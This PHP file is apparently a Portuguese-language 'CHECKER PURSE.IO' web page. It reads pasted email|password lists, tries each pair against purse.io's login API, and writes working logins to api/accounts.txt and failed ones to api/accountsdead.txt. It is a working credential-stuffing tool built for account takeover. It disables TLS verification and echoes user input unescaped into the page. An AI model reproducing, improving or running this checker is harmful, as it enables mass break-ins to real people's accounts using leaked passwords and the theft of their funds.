<?php 
include '../../dbc.php';
page_protect();


?>
<?php
$sock = '';
error_reporting(0);
function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}
class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url) {
        $ch = curl_init();
		global $email, $pwd , $token;
        curl_setopt($ch, CURLOPT_URL, $url);
       curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json; charset=UTF-8'));
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_COOKIESESSION, true);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/PURSE.IO.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/PURSE.IO.txt');
		curl_setopt($ch, CURLOPT_REFERER, 'https://carrinho.PURSE.IO.com.br/Checkout?ReturnUrl=http://www.PURSE.IO.com.br#login');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '{"device":3094148942,"username":"'.$email.'","password":"'.$pwd.'","noToken":true}');
        }                                          
    print    $data = curl_exec($ch);
        curl_close($ch);
        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func($callback, $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url) {
        return $this->doRequest('POST', $url);
    }
}

echo '
<DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<head><title>TESTADOR PURSE.IO</title></head>
<style>
			body
		{
			background-color: #FFD777;
			font-size: 9pt;
			font-family:Verdana;
			line-height:12pt;
			color: #FFFFFF;
		}
			body,td,th {
			color: #FFFFFF;
		}
		h2
		{
			color: #FFFFFF;
		}
		h1 {
			padding: 10px 15px;
			color: red;
		}

		.main-content {
				width: 70%; height: 380px;margin: auto; background: #FFFFFF;      border-radius: 5px 5px 5px 5px; box-shadow: 0 0 3px rgba(0, 0, 0, 0.5); min-height: 380px;      position: relative;
		}
		textarea, input {
				border-radius: 5px 5px 5px 5px;
		}
		input {
				height: 14px;width: 30px;text-align: center;o
		}
			
			
		.button {
			   
		}
		.submit-button
				{
						background: #FFD777;
						border:solid 1px #FFD777;
						border-radius:5px;
								-moz-border-radius: 5px;
								-webkit-border-radius: 5px;
						-moz-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
						-webkit-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
						text-shadow: 0 -1px 1px rgba(0,0,0,0.25);
						border-bottom: 1px solid rgba(0,0,0,0.25);
						position: relative;
						color:#FFF;
						display: inline-block;
						cursor:pointer;
						font-size:13px;
						padding:3px 8px;
						height: 30px;width: 120px;
				}
        .submit-button:hover {
        background:#82D051;border:solid 1px #86CC50;
        height: 30px;width: 120px;      }
 
		#show {
				width: 70%;margin: auto;padding: 10px 10px;
		}

		.business{
			font-weight:bold;
			color:yellow;
		}
		.premier{
			font-weight:bold;
			color:#00FF00;
		}
		.verified{
			font-weight:bold;
			color:#006DB0;
		}
		.fieldset{
			border: 1px dashed #FFFFFF;
			margin-top: 20px;
		}
		.tvmit_live{
			border: 1px dashed #FFFFFF;
			color:yellow;
			font-weight:bold;
		}
		.tvmit_die{
			border: 1px dashed #FFFFFF;
			color:red;
			font-weight:bold;
		}
		#result{
			display:none;
		}
	</style>
    <script type="text/javascript">
        function pushPaypalDie(str){
            document.getElementById(\'listPaypalDie\').innerHTML += \'<div>\' + str + \'</div>\';
        }
        function pushPaypal(str){
            document.getElementById(\'listPaypal\').innerHTML += \'<div>\' + str + \'</div>\';
        }
        function pushWrongFormat(str){
            document.getElementById(\'listWrongFormat\').innerHTML += \'<div>\' + str + \'</div>\';
        }
    </script>
</head>
<body>
<div class="main-content">
<center><h1>CHECKER PURSE.IO</h1></center>
<form method="post">
<div align="center"><textarea name="mp" rows="10" style="width:90%">';
if (isset($_POST['btn-submit']))
    echo $_POST['mp'];
else
    echo 'EMAIL|SENHA';
;
echo '</textarea><br />
SEPARADOR: <input type="text" name="delim" value="';

if (isset($_POST['btn-submit']))
    echo $_POST['delim'];
else
    echo '|';
;
echo '" size="1" /><input type="hidden" name="mail" value="';
if (isset($_POST['btn-submit']))
    echo $_POST['mail'];
else
    echo 0;
;
echo '" size="1" /><input type="hidden" name="pwd" value="';
if (isset($_POST['btn-submit']))
    echo $_POST['pwd'];
else
    echo 1;
;
echo '" size="1" />&nbsp;<br/><br/>

<input type="submit" class = "submit-button" value="CHECAR" name="btn-submit" /> </br>&nbsp;&nbsp;&nbsp;&nbsp;
</div>
</form>
';
set_time_limit(0);
include("use.php");
function fetch_value($str, $find_start, $find_end) {
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
}
function fetch_value_notrim($str, $find_start, $find_end) {
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end = strpos(substr($str, $start + $length), $find_end);
    return substr($str, $start + $length, $end);
}
$dir = dirname(__FILE__);
$config['cookie_file'] = $dir . '/cookies/' . md5($_SERVER['REMOTE_ADDR']) . '.txt';
if (!file_exists($config['cookie_file'])) {
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}
$zzz = "";
$live = array();
function get($list) {
    preg_match_all("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/", $list, $socks);
    return $socks[0];
}
function delete_cookies() {
    global $config;
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}
function xflush() {
    static $output_handler = null;
    if ($output_handler === null) {
        $output_handler = @ini_get('output_handler');
    }
  
   if ($output_handler == 'ob_gzhandler') {
        return;
    }
	
    flush();
    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false) {
        @ob_flush();
    } else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE) {
        @ob_end_flush();
        @ob_start();
    }
}
function curl_grab_page($site,$proxy,$proxystatus){
	$chss = curl_init();
	curl_setopt($chss, CURLOPT_RETURNTRANSFER, TRUE);
	if ($proxystatus == 'on') {
				curl_setopt($chss, CURLOPT_SSL_VERIFYHOST, FALSE);
				curl_setopt($chss, CURLOPT_HTTPPROXYTUNNEL, TRUE);
				curl_setopt($chss, CURLOPT_PROXY, $proxy);
			}
			curl_setopt($chss, CURLOPT_COOKIEFILE, "cookie.txt");
			curl_setopt($chss, CURLOPT_URL, $site);
			return curl_exec($chss);
			curl_close ($chss);
			
}
function display($str) {
    echo '<div>' . $str . '</div>';
    xflush();
}
//function pushSockDie($str) {
   // echo '<script type="text/javascript">pushSockDie(\'' . $str . '\');</script>';
  //  xflush();
//}
function pushPaypalDie($str) {
    echo '<script type="text/javascript">pushPaypalDie(\'' . $str . '\');</script>';
	file_put_contents('api/accountsdead.txt', $str . PHP_EOL, FILE_APPEND);  
    xflush();
}
function pushPaypal($str) {
    echo '<script type="text/javascript">pushPaypal(\'' . $str . '\');</script>';
	file_put_contents('api/accounts.txt', $str . PHP_EOL, FILE_APPEND);  
    xflush();
}
function pushWrongFormat($str) {
    echo '<script type="text/javascript">pushWrongFormat(\'' . $str . '\');</script>';
    xflush();
}

if (isset($_POST['btn-submit'])) {
    ;
    echo '<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<legend class="tvmit_live">LIVE:<br/><div id="listPaypal"></div></legend>
<br/>
<legend class="tvmit_die">DIE:<br/><div id="listPaypalDie"></div></legend>
<br/>
<legend class="tvmit_die">INVALIDAS: <br/><div id="listWrongFormat"></div></legend>


';
    xflush();
    $emails = explode("\n", trim($_POST['mp']));
    $eCount = count($emails);
    $failed = $live = $uncheck = array();
    $checked = 0;
    if (!count($emails)) {
        continue;
    }
    delete_cookies();
    //$sockClear = isSockClear();
    //if ($sockClear != 1) {
        //pushSockDie('[<font color="#FF0000">' . $sock . '</font>]');
        //continue;
    //}

    foreach ($emails AS $k => $line) {
        $info = explode($_POST['delim'], $line);
        $email = trim($info["{$_POST['mail']}"]);
        $pwd = trim($info["{$_POST['pwd']}"]);
        if (stripos($email, '@') === false || strlen($pwd) < 2) {
            unset($emails[$k]);
            pushWrongFormat($email . ' | ' . $pwd);
            continue;
        }
        //if ($failed[$sock] > 4)
         //   continue;
if(file_exists(getcwd().'/PURSE.IO.txt')) {
        unlink(getcwd().'/PURSE.IO.txt');
    }
	
	$a = new cURL();
	    $b = $a->post("https://app.purse.io/login");
    $d = $a->post("https://api.purse.io/api/v1/auth");
	
$checked++;

 
	if($d){
	
	
		if (stristr($d,'"expire_time') !== false) {
			$xyz = "<b style=\"color:green\">Live</b> =>  <b style=\"color:white\" >$email</b> | <b style=\"color:white\">$pwd<b/> |<b style=\"color:red\">#TechnologyChecker</b>";
            $live[] = $xyz;
            unset($emails[$k]);
            pushPaypal($xyz);
			
			}
			else{
				
			
				pushPaypalDie("<b style=\"color:red\">Die</b> => $sock | <b style=\"color:Gray11\" >$email<b> | $pwd ");
				
			unset($emails[$k]);
			
				 
			}
        
	}
	}
}
//if (isset($eCount, $live)) {
//    display("<h3>Total: $eCount - Testado: $checked - Aprovado: " . count($live) . "</h5>");
//    display(implode("<br />", $live));
    if (count($emails)) {
        display("Sem Testar:");
        display('<textarea cols="80" rows="10">' . implode("\n", $emails) . '</textarea>');
    }

echo '</body>
</html>';